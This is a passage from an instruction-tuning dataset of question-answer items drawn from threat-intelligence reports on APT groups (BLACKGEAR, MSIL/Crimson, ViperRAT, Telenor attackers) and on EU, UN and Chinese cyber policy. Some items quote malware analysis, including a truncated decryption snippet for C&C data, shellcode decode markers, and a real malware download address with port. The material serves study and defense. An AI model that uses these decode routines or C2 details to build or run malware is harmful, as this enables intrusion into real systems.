(Jones, 2008). The EU has several initiatives involving different agencies but lacks an overall cyber security strategy. The European Commission has the Information Society and Media Directorate General, the European Network and Information Security Agency (ENISA), and the Contact Network of Spam Authorities that deal with different aspects of cyber security. The Information Society and Media Directorate has a program to improve the content of the internet by protecting people from child pornography, racism, and other harmful online content. The ENISA is an agency that was created in 2004 to raise awareness of cyber security issues and to promote best practices by member nations with the EU. The Contact Network of SPAM authorities is an initiative to counter SPAM and share information on best practices between EU member nations. (Cornish, 2009:24-27)\nThe European Parliament has established several standing committees concerned with cyber security issues. The Committee on Industry, Research, and Technology (ITRE) is concerned with establishing information technology networks within the EU. The Committee on Civil Liberties, Justice, and Home Affairs (LIBE) is responsible of the protection of personal information on the internet for members of the EU. The Committee on Foreign Affairs is responsible for the Security and Security policies of the EU which includes internet security policies. (Cornish, 2009:26)\nThe European Police Office (EUROPOL) is an agency of the Police and Judicial Co-operation (PJC) that has more of a direct role in EU cyber security in the context of combating terrorism, organized crime, and financial crime (Cornish, 2009:25). Although cyber security is addressed by the EU there is no organization within the EU to ensure that there are no contradictions in cyber security policy among all of the various EU agencies, commissions, and co-operations. The European Parliament commissioned a study on cyber security published February 2009 that examined security challenges concerning the internet for the EU. The study recommended that clear roles should be defined for cyber security responses with the many EU organizations, including the establishment of the post of cyber security coordinator and the establishment of a common operating vision for cyber security in order to achieve operational consistency across the EU (Cornish, 2009:31). The EU and Russia work\ntogether on different challenges including drug and human trafficking, organized crime, and counter-terrorism. Russia is also the EU's third largest trading partner (European Commission, 2009). The EU's cyber security organizations can offer a framework for increased cooperation to defeat cyber attacks that originate from or are directed at Russia.\nMedium Headline: 6.4. The United Nations\nThe main purpose of the United Nations (UN) is to maintain international peace and security among the different nations of the world (United Nations, 1945). The focus for cyber security for the UN, through the UN Security Council, has been on countering terrorism. Debates among the UN General Assembly started in 2002 highlighted the growing dependence on IT use. Out of discussions came a warning that law enforcement activities would not be sufficient but that more efforts in cyber security need to be made on prevention. (Cornish, 2009:17)\nThe International Telecommunication Union (ITU) is the main organization that is responsible for cyber security within the UN framework. The ITU's goal is to enhance cyber security in order for individuals, businesses and nations to have confidence in the use of cyberspace. The ITU uses its Global Cyber Security Agenda, which began in 2007, to promote its goals of increased cyber security. The ITU has not been an agency for the enforcement of legislation and international agreements concerning cyber security but has focused on assisting in building nation's capabilities for cyber security (Cornish, 2009:17-18). Former Soviet satellites can cooperate with the ITU to improve their cyber defences against cyber criminals from Russia or any other nation. The UN will continue to be a forum for Russia to voice grievances or defend themselves against world opinion in matters involving international peace and security including cyber security.\nMedium Headline: 6.5. Relevance of multilateral initiatives\nAlthough the Russian government cooperates with Europe and other nations on a variety of economic and security issues, individuals, organizations, and governments are able to exploit the weaknesses of the international system in order to use the internet for criminal activities without fear of any major reprisals. Significant effort has been made towards cyber security since the cyber attack on Estonia in 2007, but much\nmore needs to be done among national and international organizations to ensure genuine cyber security. The framework for increasing cyber security exists, but it will take the cooperation of many nations, including Russia, to make a difference in cyber security.\n\nWhat are the key initiatives and agencies within the European Union (EU) that address cyber security, and what challenges does the EU face in implementing a coherent cyber security strategy?",
    "output": "A: Key initiatives and agencies within the EU include the Information Society and Media Directorate General, the European Network and Information Security Agency (ENISA), and the Contact Network of Spam Authorities. The EU also has several standing committees, such as the Committee on Industry, Research, and Technology (ITRE), the Committee on Civil Liberties, Justice, and Home Affairs (LIBE), and the Committee on Foreign Affairs. However, the EU lacks an overall cyber security strategy and faces challenges in ensuring consistency across its various agencies and commissions. A study recommended defining clear roles for cyber security responses and establishing a common operating vision for cyber security.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Profiting from the Product\nSo who is most likely to profit from the information being gathered through these attacks? The political, economic and intelligence reporting has a clear audience, but deciding who the commercial intelligence should be passed to presents a more taxing problem. Which companies receive this kind of assistance? The answer may lie in the particular brand of capitalism which China practices.\nChina is no longer the planned economy it once was and some Chinese companies are now among the largest in the world. But this is not capitalism as we know it and these companies are far from being truly 'private'. All the largest companies in China are State Owned Enterprises (SOEs) in which the state is the largest (or only) shareholder. The state can and does change company board members at will and members of the armed forces are routinely brought into senior management roles. But in addition to simply appointing the heads of companies, the Party also has a final say over the strategic direction of each company, business planning processes and the size of salaries paid to employees. After all, if companies are seen to be profiting unfairly at the expense of the workers that could lead to political unrest.\nThere are currently 117 companies classed as SOEs and under the control of the State-owned Assets Supervision and Administration Commission (SASAC), the primary shareholder in these companies. To give some idea of the scale of SOEs, they now comprise 80% of the value of China's stock market. Yet in the last 10 years, the number of SOEs has almost halved as SASAC has pushed through mergers of companies with similar strengths to consolidate the overall power of these companies in various sectors and make them more competitive outside China. SASAC works alongside the Communist Party's Organisation Department, which acts as a human resources department and makes certain that those running these businesses care every bit as much (if not more) about pleasing Party bosses as they do about their success in business.\nIn addition to the Party's input to the strategies pursued by these companies, the state is also instrumental in guiding them to financial success by other means. Most significantly it arranges cheap lines of credit, allowing companies to borrow money for expansion; and provides a ready-made market for the company \u2013 the Party has the ability to block competitors from any industry or to introduce policies which make competitors more expensive. The state can also provide considerable human resources if a particular company or industry needs to increase production suddenly: large pools of labour in China work for the state rather than companies and so form a mobile and flexible workforce. But if at the end of the day the products or services a company offers are outdated or of poor quality, that company will fail. The Party has a vested interest in every SOE performing well\nand becoming a national or global champion in its sector, so it may be willing to extend help through the leveraging of intelligence sources. Note the list of companies and sectors in Appendix A: it is clear that the companies on the list all have interests in areas which will support the Five Year Plan and Indigenous Innovation.\nMedium Headline: Hypothetical Case Study: Aircraft Construction\nOne good example of how the Party could use its intelligence collection methods to benefit an SOE is seen in the case of COMAC16 , the Commercial Aircraft Corporation of China. COMAC is currently trying to build a large aircraft to compete with the likes of Boeing and Airbus. In an excellent in-depth paper on Indigenous Innovation17 , the US Chamber of Commerce and strategic consulting firm ACPO Worldwide18 detail the desire of China to build an aircraft since the crash (and subsequent re-engineering) of a Pakistan Airlines Boeing 707 in 1971. The re-engineered plane named the Yun-10 was a complete failure as China did not at that time possess all the necessary technology required to make it a success.\nWith a rise in the use of air transport within China, domestic carriers are being forced to buy foreign aircraft at enormous cost, whereas a home-grown aircraft could be sold much more cheaply. The COMAC C91919 is designed to rival the Boeing 737 and Airbus A320 and planned to be operating by 2015, and to encourage foreign companies to share their technology, China has promised access to the market. Companies including Parker Aerospace, General Electric, Honeywell and Goodrich have all signed up. Whether they benefit from this move in the long term, or are instead encouraged to leave once they have been bled dry of useful information, remains to be seen. But for all the help they are getting, Chinese engineers are not yet able to access the technology developed by Boeing and Airbus, or by large aeroplane engine suppliers such as Rolls Royce.\nWe know therefore that there is intent to build a domestic airliner and that previously re-engineering has been attempted. Technology transfer is ongoing at the moment, but how (hypothetically) could computer network exploitation attacks help China achieve its goal?\nIt is hard to imagine that a project of that size would not be given some assistance by the government, given that there is national pride at stake. If intelligence or military resources could be directed against Boeing and Airbus networks there would be some very quick wins. Not only could design documents and technical information be stolen en masse and without the need to actually deal with the company, but there could be some weak links in the supply chains of these companies which would help an attacker to penetrate their networks.\nFirst, smaller suppliers would provide an easy target from where attacks could be launched directly, spoofing emails with Trojans to improve the chance of recipients opening them. Second, both companies have facilities in China, presumably with network connectivity which may provide a direct route into the main network. There are also Chinese citizens working for the two target organisations who could be tasked to download something nefarious or plug in a USB drive to help their country.\n16\n17\n18\n19\nFinally all large organisations share large amounts of their data with third parties such as law firms and consultants; companies that may not protect their networks as effectively as the target company. These 'data aggregators' can present a major vulnerability in the security of sensitive data.\nThe end goal of the project is to sell the aircraft worldwide and to undercut the established suppliers. COMAC could achieve this by using lines of credit at favourable rates from the Chinese banks that would help to make deals cheaper for airlines purchasing aircraft. But what really helps these companies undercut foreign rivals is that they have not needed to spend huge amounts of money on R&D to get the plane off the ground in the first place.\nIf designs for the body of the aircraft could be stolen along with aerodynamic information it would cut development time by years; and by billions of dollars. If stolen engine designs were also used that would cut costs further still. Even if the companies from whom this technology had been stolen were able to see that it had been stolen, they would only be able to take limited action in response; and to do so could put at risk their continued ability to operate or sell in China.\nThe list of SOEs in \"Appendix A\" is dominated by transport companies (rail, aerospace and shipping), energy (petrochemical, nuclear, power generation/distribution, hydro), telecoms (mobile, infrastructure), manufacturing, extraction/metals (coal, iron, steel, minerals, aluminium) and trading companies. If a company has been targeted by Chinese state sponsored cyber espionage, we believe that any information stolen probably ends up in one of these SOEs. While China is able to manipulate market conditions in various ways to help SOEs prosper, nothing would contribute more to their growth and success than a supply of inside information about the activities of their competitors and customers.\nRead the text above and answer this question: How might the strategic use of stolen information help COMAC undercut established aircraft manufacturers like Boeing and Airbus?",
    "output": "Stolen information, such as designs for aircraft bodies and engines, could significantly reduce development time and costs for COMAC. By avoiding the need for extensive R&D, COMAC could save years and billions of dollars. Additionally, favorable lines of credit from Chinese banks could make deals cheaper for airlines purchasing COMAC aircraft. This combination of reduced costs and financial incentives would allow COMAC to undercut established competitors like Boeing and Airbus, making their aircraft more attractive to potential buyers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Case expansion through domain usage and registrations\nIn almost all cases, the domains registered by the attackers are \"privacy protected\". This means that the registrant has paid the domain registrar to withhold identity information related to the registration. This is done almost to perfection. Another feature is that almost all websites belonging to this attacker has their robots.txt set to \"disallow\" to stop them from being crawled.\nHowever, by searching historical IP data for the IP addresses of domains known to be involved we found a number of other domains likely belonging to the same infrastructure. These domains were then further verified against malware samples to ascertain valid connection to attackers. Some care needs to be taken when working with IP addresses, as there are possibilities of false correlations on, for example, domain parking IP addresses, sinkholes and webhosting servers.\nIP history on researcherzone.net. Source: DomainTools\nA selection of passive DNS data on just one of the known IP addresses which was known to have served malware (1)\nAdditional data may be gleaned by querying the IP addresses themselves. Many have set up a default ESMTP (mail) server on port 587/tcp, which responds with a configured banner. For example, the domain onlinestoreapp.net (used by malware MD5 a7b5fce4390629f1756eb25901dbe105) resolved to the IP address 37.59.231.161, and this happens when connecting to that IP on ESMTP:\n$ telnet 37.59.231.161 587\nTrying 37.59.231.161...\nConnected to 37.59.231.161.\nEscape character is '^]'.\n220 server.enlighten-energy.org ESMTP Exim 4.80.1 Sat, 23 Mar 2013 16:44:44 -0400\nenlighten-energy.org is another of the known bad domains used against Telenor.\nAll of this enabled us to draw a domain map over the infrastructure (next page). This map is probably larger than shown here; there might be domains owned by the attackers that are not plotted on this map because we could not prove they were malicious, and many domains we have not found yet. Conversely, many of the domains plotted were used in attacks years ago and may never be again.\nAbove: Domain map of the attack infrastructure. Yellow and orange nodes constitute domains, where the orange have been verified malicious and yellow are likely malicious. Blue nodes are IP addresses, and purple are autonomous systems (AS). Green nodes are domains that are not part of any attack pattern, but are interesting in this context. Red nodes show connections to known or likely attacks.\n\nAnswer this question based on the above context: What methodologies were employed to expand the investigation into the APT's infrastructure, and how were potential false correlations mitigated during this process?",
    "output": "The investigation expanded by searching historical IP data for the IP addresses of domains known to be involved in the attack. This led to the discovery of additional domains likely belonging to the same infrastructure. These domains were further verified against malware samples to confirm their connection to the attackers. To mitigate potential false correlations, researchers took care to consider factors such as domain parking IP addresses, sinkholes, and web hosting servers, which could lead to incorrect associations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: C&C configuration retrieval\nBackdoors used by BLACKGEAR share a common characteristic: they all retrieve encrypted C&C configuration information from blogs or microblogs. An attacker would register an account on these services and then create posts. The encrypted C&C information would be between two hardcoded tags, as seen below:\nThere are two reasons BLACKGEAR would use this technique. First, the beacon traffic of the backdoor would look like normal traffic to blogs. Secondly, the threat actor would be able to quickly change the C&C servers used if these were blocked. A defender would be unable to block this change in server from reaching any affected machines unless the legitimate site was blocked as well.\nBig Headline: Tools Used by BLACKGEAR\nThe malware tools used by BLACKGEAR can be categorized into three categories: binders, downloaders and backdoors. Binders are delivered by attack vectors (such as phishing and\nwatering hole attacks) onto a machine. These, in turn, drop decoys and downloaders. The latter connect to various sites under the control of the attacker and downloads backdoors. These use persistent methods to ensure that they remain present on the affected machines to give attackers access to the machine in question.\nBy separating the attack tools into three stages, threat actors are able to adapt quickly. If one component is detected and/or blocked, it can be replaced without disrupting the entire toolset.\nMedium Headline: TSPY_RAMNY\nTSPY_RAMNY is a downloader dropped by TROJ_BLAGFLDR malware. To remain persistent, it moves itself to the Windows temp folder and drops a *.lnk (Windows Shortcut) file in the startup folder that points to itself. It also sends information about the compromised host (such as network settings) back to the download site.\nThe download link is formatted in the following format:\n\u2022 http://{IP address}/{folder name}/{webpage name} (Example: http://{IP address}/multi/index.html)\nThis is done so that if someone looks solely at the URL, the download of the backdoor will appear to be an ordinary website.\nMedium Headline: TSPY_YMALRMINI\nTSPY_YMALRMINI is another downloader that is dropped by TROJ_BLAGFLDR malware, which also sends information about compromised hosts back to the download site. We were unable to determine which payloads were used by this downloader. However, our research indicates that some of these downloads are saved as drWaston.exe on the compromised host. This same file name is also used by some ELIRKS variants, indicating a possible connection. TSPY_YMALRMINI uses the same URL format as RAMNY.\nTSPY_YMALRMINI has the same download link pattern as TSPY_RAMNY. The family name for this malware is because some variants have the PDB string \"C:\\toolson-mini\\YmailerCreater \u2013 Debug\\Binder\\Binder\\YMailer.pdb\". In addition, these variants also create a log file named YmailerMini.log.\nMedium Headline: BKDR_ELIRKS\nBKDR_ELIRKS was the first family of backdoors tied to BLACKGEAR. It retrieves encrypted C&C configuration information from various blogging or microblogging services. Once decoded, it connects to these C&C servers and waits for commands given by a threat actor. To remain persistent, it moves itself to the Windows temp folder and drops a *.lnk (Windows Shortcut) file in the startup folder that points to itself.\nIts backdoor routines include getting information from the compromised host, downloading and running files, taking screenshots, and opening a remote shell.\nMedium Headline: BKDR_ELIRKS\nReverse analysis of ELIRKS allowed us to determine how to decrypt the C&C information, which is done in the following Python code:\n#! /usr/bin/env python\nfrom ctypes import *\ndef decipher(v, k):\ny=c_uint32(v[0])\nz=c_uint32(v[1])\nsum=c_uint32(0xC6EF3720)\ndelta=c_uint32(0x61C88647)\nn=32\nw=[0,0]\nwhile(n>0):\nw[0]=y.value\nw[1]=z.value\nreturn w\nThe malware contains shellcode with two things: the URL of the blog entry and the tags that identify where in the fake articles the hidden C&C information is located. Once the fake blog/microblog posts are downloaded, the malware finds and decrypts the C&C information.\nThe C&C information is stored in the post in two short bits of text. The first is an eight-character string that is decoded into a six-byte hexadecimal value. The second is a two-character string which is already in a hexadecimal format, and is concatenated towards the end. A modified version of the (<https://web.archive.org/web/20070127094759/http:/www-users.cs.york.ac.uk/~matthew/TEA/>)TEA algorithm decrypts these into the C&C server locations.\nMedium Headline: BKDR_YMALR\nBKDR_YMALR implements the same behavior in a slightly different manner. It contains several encrypted strings:\nThese encrypted strings are the result of the blog URLs and tags being first encoded with Base64, and then encrypted with DES. The encryption key and initialization vector are hardcoded, with both set to 1q2w3e4r. (Note how these are positioned on a normal keyboard.)\nOnce these have been decoded, BKDR_YMALR uses the same algorithm as ELIRKS to obtain the C&C information.\nBig Headline: Connections between tools\nMore than just tools being used together, it appears that there are distinct connections between the different tools used by BLACKGEAR. The string \"YMailer\" shows up in the filenames of log files used by both BKDR_YMALR and TSPY_YMALRMINI, and it is in the PDB strings of the latter. The two downloaders TSPY_RLMNY and TSPY_YMALRMINI both use the\nstring toolson in different places. Lastly, both downloaders and one backdoor share the same decryption key 1q2w3e4r. The above illustration shows the connections between the families.\nMedium Headline: BKDR_ELIRKS\n\u2022 17cacabcf78c4b164bb0e7d9200289be9236e7bc\n\u2022 4157ecd252dc09b533fcf6a778aca2c376601354\n\u2022 4f54cfcf266b73ca3759b9cb0252c27094b5b330\n\u2022 521a9d73191c7740f969ae3c53e6abf70ffbedf9\n\u2022 533565f7953fb1648d437d14d007003c6343b9ae\n\u2022 80108d2aacb0a1f2a5350f71e7a04239fc5f96a9\n\u2022 8cad1bcbdd558802b34119fb57160cc748170133\n\u2022 9a768fae41ca7395b4257e85acef915e124c2981\n\u2022 a70001c67e81d1dcf62f808760514b6df28a411a\n\u2022 a9ea07caafeb63133e5131f7a56bc8da1bc3d72a\n\u2022 dd0ceafbe7f4bf2905e560c3348545e32bc0f684\nBKDR_YMALR\n\u2022 02fed8cae7f3986c1344dd75d869ba23cfc4073a\n\u2022 09d73b522f36786bb6e645b96f244bb51c3cc7ea\n\u2022 0a59d52367435bc22a92c27d60023acec575a5fb\n\u2022 0cc74332b1e213456693159d3ba12a3421036f68\n\u2022 1120f049dcb4a62809687dc277b42589d8d1caa6\n\u2022 12c8cc7e125572d614b708c056f7fd0ed49870c5\n\u2022 29b08d270ba6efcf57ca2ad33d8e3edd93d6b32a\n\u2022 2d3d7b9521aec637f2e99624e0489b9f140d463f\n\u2022 2de7d78615ec0fbf2652790d53b50ddb0472292c\n\u2022 31de946255b240c0ae2f56786ac25183f3aaeea5\n\u2022 3aa8509715c7f55bdee831d5f7db22a2c516db43\n\u2022 3d175b1defe7076e0fe56076dd0d5f438de43324\n\u2022 4000244b2cba78a45034bb6ab2bac46d6a8a79ea\n\u2022 4882735e8a465fac938fd04546a51efefb9806da\n\u2022 48d373bdb31dcecd7f59bd5a964d062c8b6bfce8\n\u2022 49f6eb7f8e4a27f574c9a3e8c0da0b7895df7e41\n\u2022 4c7df09012fc88d336467691acf0afce64f40341\n\u2022 551f9a60203bec904487113e8d42dea463ac6ca9\n\u2022 5a4b15fa5a615a93191ede4c75dd3e65e87586dc\n\u2022 5aa5117db6f420c81d2e1a7f036963a3c6ef02e9\n\u2022 5dc007d056513cba030ec16e15bdbb9ea5fe0e5a\n\u2022 628309a60ad1fbe240486519de1424f7ddc2df4d\n\u2022 636e7a9effb1a244697c880832e486de56260527\n\u2022 6bb5f51d03edd1acd7d38cca8095a237543c6a0d\n\u2022 6c4786b792f13643d408199e1b5d43f6473f5eea\n\u2022 6dd997409afec6fafbe54bd9d70d45fffff6a807\n\u2022 7142ca7079da17fa9871cbc86f7633b3253aeaed\n\u2022 7254b719fd3cf87c8ac8ed9327c8e1bf99abf7af\n\u2022 7329a789363f890c401c286dbaf3d2bf79ee14f7\n\u2022 7b2c4d14710cf2fd53486399ecc5af85cd75eca6\n\u2022 88e22933b76273793e4278c433562fb0b4fe125a\n\u2022 8917c582ab5c2e831de6eba33b4f19d6e3a2cb70\n\u2022 8c325e92bf21d0c3737dbbc596854bc12184eeaf\n\u2022 8f65cbde2f3b664bcede3822a19765bdb7f58099\n\u2022 9047b6b2e8fbaa8a06b2faaa30e038058444106a\n\u2022 93c3f23905599df78cd5416dd9f7c171b3f1e29e\n\u2022 94750bdae0fa190116a68e96d45f3d46c24b6cf1\n\u2022 9954a1c8e7b0e2f17841608f6b8c9d042b7a0780\n\u2022 9b96646d152583ff58c2c29191cb1672847d56b6\n\u2022 9f5a3b6db752d617f4d278d6531e2bbdb7faa977\n\u2022 a30cc98ceb5d3379e80443f68a186326926f73ce\n\u2022 a893896af5468ac6e04cdd13edff8cae04800848\n\u2022 a8f461749c7fe2a21116b8390cf84a8300009321\n\u2022 a9108bf3ce39cea40e46ac575247a9a7c077b2a8\n\u2022 a9fd9ade807af4779f3eea39fed2c583a50c8497\n\u2022 ac014e4c2d68f6c982ac58738857b698b9e46af5\n\u2022 acaec2b0f86ec4262be5bb8bcebcc12093e071ba\n\u2022 ad61c51b03022ef6bcb5e9738fe2f621e970ecb3\n\u2022 b28f6ba3d6571c5d85cb5276cbcdce9adf49d5a9\n\u2022 bc61f1b3c8eb3bda2071f6caf71ff23705128ca5\n\u2022 c30b305a7bea9a2f61aca2dbcf596c2b0c0e4fa0\n\u2022 c4c747f26f95fdbfc5bff04688dc76ae0bb48fff\n\u2022 c58d6fc761dec675ab45ad5c3682ffc9936cf357\n\u2022 c85f528900aa9d836abd88eb56902efd711491da\n\u2022 ca163d6ae85edede87b271267918a0ffe98040c7\n\u2022 cf629249fb4af86746059e638ccef5b8a43c6834\n\u2022 cfd9a67b4b0eb3d756bb7e449b46687e6aef006b\n\u2022 d107268bd767a2dfe1c8733b7da96c1a64f5d112\n\u2022 d7cd079f8485ea55443ed497f055dbed5ae4a668\n\u2022 d95c97f1525e9888571f498f2be584dda243da2a\n\u2022 e01f9ba6355bcdc7ccf89261658bff9f965b8c21\n\u2022 e05efde2b442dc4119179e3c39c74a973499e271\n\u2022 e1acfed710f186d86a2bc8179ff38fdd21f9a1b6\n\u2022 e1fb2e1866f332a5656bf55fde13ff57d5f0bbf6\n\u2022 e77303d80968395eec008515ea9eb3c620b14255\n\u2022 eb9e553524d414d862857297baf44da3b4072650\n\u2022 eca06f3c535ba3b3463917974a79efc821fddb6c\n\u2022 eeb065a1963a8aa0496e61305c076c5946d77e12\n\u2022 efa611262e6d4804ce9026d50bfa64f20d9271ca\n\u2022 fb59481d153388d2ad3bb6321d0b2875cb07f4d3\n\u2022 fbcbbc187e99317c5a36a3667592590a7f5a17d1\n\nQ: How does BLACKGEAR leverage blogs and microblogs to conceal its C&C configuration information? Why is this method effective against traditional detection mechanisms?",
    "output": "A: BLACKGEAR uses blogs and microblogs to store encrypted C&C configuration information between two hardcoded tags. This technique is effective for two main reasons. First, the beacon traffic of the backdoor looks like normal traffic to blogs, making it harder to detect. Secondly, the threat actor can quickly change the C&C servers if they are blocked, by simply updating the information in the blog posts. This makes it difficult for defenders to block the new C&C server information from reaching affected machines unless they block the legitimate site entirely.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 3 Russia\nSince the turn of the century, Russia has been publicly admiring European values while simultaneously emphasising sovereignty and a strong national defence.8 Moscow insists that 'each nation in the region should be given a right to experiment with its own democratic model that fits its national and international conditions'. 9 This tension may only grow stronger with time, and we may see further Russian moves away from shared values in the future as Moscow confronts not only Ukraine but also the West more generally, including in Syria.\nRegarding Ukraine, Russia insists it is a bystander and even a victim. Putin said, 'There are still many threats and challenges in the world today. As you may know, in Europe, militant nationalism is raising its head here and there \u2013 the one that once led to the appearance of the Nazi ideology. I will not dwell on each of the hotspots separately \u2013 we all know where the danger is. Incidentally, the situation in our neighbouring brotherly Ukraine is an example of the disaster and loss such an irre-sponsible policy can bring about.'10 In explaining Gazprom's tough stance vis-\u00e0-vis Ukraine, for example, Putin has argued that there was no other choice but to take a hard line against Kyiv,11 again placing Russia as a bystander, not an active party.\nPutin has consistently delegitimised Poroshenko's government:\n'There can only be one assessment: this was an anti-constitutional takeover, an armed seizure of power [that] significantly destabilised the east and south-east of Ukraine [\u2026] we see the rampage of reactionary forces, nationalist and anti-Semitic forces going on in certain parts of Ukraine, including Kyiv [\u2026] Are the current authorities legitimate? The Parliament is partially, but all the others are not. The current Acting President is definitely not legitimate [\u2026] one set of thieves [is] being replaced by another. [\u2026] We will not fight with the Ukrainian people [but] I do not have a partner at the top level there'.12\nThroughout the Ukraine crisis which began in 2014, Vladimir Putin has not once used the word 'cyber'. This does not signify a lack of interest in the subject, or that Russia has not engaged in computer network operations, but it does demonstrate a preference not to discuss the issue, which in turn likely means that cyber warfare as a distinct form of attack, from\nThroughout the Ukraine crisis, Vladimir Putin has not once used the word 'cyber'.\n8 Andrei P. Tsygankov. Russia's Foreign Policy: Change and Continuity in National Identity (Rowman & Littlefield Publishers, 2013), 181.\n9 Ibid.\n10 'Meeting with Presidents of Armenia, Belarus, Kyrgyzstan and Tajikistan' Website of the President of Russia, 8 May 2014), http://en.kremlin.ru/events/president/news/20980.\n11 'Message to the leaders of European countries regarding the supply and transit of Russian gas across the territory of Ukraine' Website of the President of Russia, 15 May 2014, http://en.kremlin.ru/events/president/news/page/82.\n12 'Vladimir Putin answered journalists' questions on the situation in Ukraine' Website of the President of Russia 3 April 2014), http://en.kremlin.ru/events/president/news/20366.\nRussia's perspective, has not played a major role in the Ukraine conflict. There have been some commercial reports alleging specific Russian cyber attacks, such as that by the security firm FireEye,13 but these are typically dismissed as Western propaganda. According to Kremlin spokesman Dmitry Peskov, 'We know that blaming Russia for everything has turned into a sport'. 14\nPutin did refer to the stories about phone hacking and surveillance of top politicians, which were prominent in the news in 2014:\n'As for the facts of cyber espionage that you mentioned, it not only amounts to overt hypocrisy in relationships between allies and partners, but also a direct violation of the state's sovereignty, an infringement on human rights and an invasion of privacy. We are looking forward to jointly developing an international information security system'.15\nThis quote may indicate an underlying assumption of Russian doctrine: today, everyone is spying on everyone, there are currently no acceptable international laws to govern such activities in cyberspace, and Russia must be a part of any credible effort to develop such norms.\nAlthough Russia claims not to be directly involved in the Ukraine conflict, Moscow still wants to direct its peace-making efforts. Putin has championed a consideration of Ukraine's eastern regions16 has produced a diplomatic solution called the Putin Plan17 and 'gave the instruction to hold consultations with foreign partners, including the IMF and the G8 countries, on organising financial assistance for Ukraine'. 18\n\nBased on the above text, answer a question. Why has Vladimir Putin consistently avoided discussing cyber warfare, particularly in the context of the Ukraine crisis? What implications does this have for Russia's approach to cyber operations?",
    "output": "Vladimir Putin has not once used the word 'cyber' throughout the Ukraine crisis, indicating a preference not to discuss the issue publicly. This does not mean a lack of interest in the subject or that Russia has not engaged in computer network operations. Instead, it suggests that cyber warfare, from Russia's perspective, has not played a major role in the Ukraine conflict. This silence may also reflect a strategic decision to avoid acknowledging cyber capabilities, thereby maintaining plausible deniability and avoiding international scrutiny.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the ViperRAT APT collect and exfiltrate sensitive information from targeted devices? Describe the types of data that are of particular interest to the attackers.",
    "output": "The ViperRAT APT collects a significant amount of sensitive information from targeted devices, with a particular focus on exfiltrating images and audio content. The attackers achieve this by hijacking the device camera to take pictures and capturing audio recordings. Additionally, they gather data such as the device's location, contact lists (including profile photos), messages, browsing history, screenshots from other apps, and conversations held near the device. This comprehensive data collection allows the attackers to gain deep insights into the victim's activities and associations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Attack against Indian Embassies in Saudi Arabia and Kazakhstan\nOn February 11, 2016, we discovered two attacks minutes apart directed towards officials at Indian embassies in both Saudi Arabia and Kazakhstan. Both e-mails (Fig. 1, 2) were sent from the same originating IP address (5.189.145[.]248) belonging to Contabo GmbH, a hosting provider that seems to be currently favored by these threat actors. The e-mails also likely utilized Rackspace's MailGun service and both of them were carrying the same exact attachment.\nMedium Headline: Doc dropped:\n6a69cd7a2cb993994fccec7b7e99c5daa5ec8083ba887142cb0242031d7d4966,svchost.exe functionality: downloader\nIn this incident, the attachment was a weaponized RTF document utilizing CVE-2012-0158 to drop an embedded, encoded portable executable (PE). To decode the embedded PE, the document's shellcode first searches for the 0xBABABABA marker that, when found, will indicate the beginning position of the PE (Fig. 3). The PE is then decoded using the key 0xCAFEBABE while skipping null DWORDs (Fig. 4). A final marker indicates the end of the PE file, which, in this case, is the marker 0xBBBBBBBB. This decode routine, including other components of the exploit document, have been discussed before and have been observed in completely unrelated incidents.\nAfter successful exploitation and decoding of the embedded payload, a family of malware we refer to as MSIL/ Crimson will be executed on the victim's machine. The first stage in infection is a downloader whose purpose is to download the more fully featured RAT component. The MSIL/Crimson downloader that was dropped (md5: 3a67ebcab5dc3563dc161fdc3c7fb161) will attempt to download the full RAT from 213.136.87[.]122:10001 (Fig. 5). A full description and analysis of the MSIL/Crimson malware family is provided in the Technical Analysis section.\n\nQ: How does the MSIL/Crimson malware utilize the CVE-2012-0158 vulnerability to execute its payload, and what specific techniques are employed to decode the embedded portable executable (PE)?",
    "output": "A: The MSIL/Crimson malware utilizes the CVE-2012-0158 vulnerability to execute its payload through a weaponized RTF document. The process involves several steps: First, the document's shellcode searches for the 0xBABABABA marker, which indicates the beginning position of the embedded PE. The PE is then decoded using the key 0xCAFEBABE while skipping null DWORDs. A final marker, 0xBBBBBBBB, indicates the end of the PE file. This decode routine, along with other components of the exploit document, has been observed in other unrelated incidents. After successful exploitation and decoding of the embedded payload, the MSIL/Crimson downloader is executed on the victim's machine. The downloader's purpose is to retrieve the more fully featured RAT component from a specified IP address, in this case, 213.136.87[.]122:10001.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: EXECUTIVE SUMMARY\nCompanies now not only face cyber attacks from hacking groups, script kiddies and hactivists, they are also threatened by state-sponsored agencies with limitless resources. These agencies usually carry out cyber attacks to seek a competitive edge, gain access to intellectual property, or for sheer sabotage. In other words, cyber threats have never been more pervasive and attack damages never more real.\nThe situation is especially grim for the Energy and Natural Resources (ENR) industry. The sector is plagued by two key problems. For one, top management has traditionally not placed sufficient emphasis on information security. Also, much more focus is placed on connectivity compared to security. As a result, the ENR sector has become an enticing and relatively easy target for cyber attacks.\nAs evidenced in recent cyber incidents \"Shamoon1\" and \"Night Dragon2\", the resultant loss and combined damage, be it substantial or intellectual, would be far greater than the cost of preventive security measures.\nIn this increasingly insecure environment, senior management should refresh their perspective to safeguard their key corporate assets.\nFor many organisations in the Asia Pacific, a cyber security-oriented structural transformation might be necessary.\n\"I am convinced that there are only two types of companies: those that have been hacked and those that will be. And even they are converging into one category: companies that have been hacked and will be hacked again.\"\nRobert S. Mueller, FBI Director\nRSA Cyber Security Conference March 2012\n1 Shamoon, also known as Disttrack, is a modular computer virus discovered in 2012 that attacks computers running the Microsoft Windows \"NT\" line of operating systems. The virus is being used for cyber espionage in the energy sector. Its discovery was announced on 16 August 2012 by Symantec, Kaspersky Lab, and Seculert.\n2 Operation Night Dragon was a Cyber Attack against energy companies which was exposed by the security company McAfee. Night Dragon attacks are designed to steal sensitive data from targeted organisations. Unlike opportunistic attacks, the perpetrators appear to be sophisticated, highly organised, and motivated in their pursuits.\nBig Headline: An attacker's perspective\nUnderstanding the perspective of an attacker is essential for everyone involved in fighting cybercrime. For that reason, staff in KPMG Netherlands interviewed one of their professionals \u2013 an 'ethical hacker'. He relayed us an 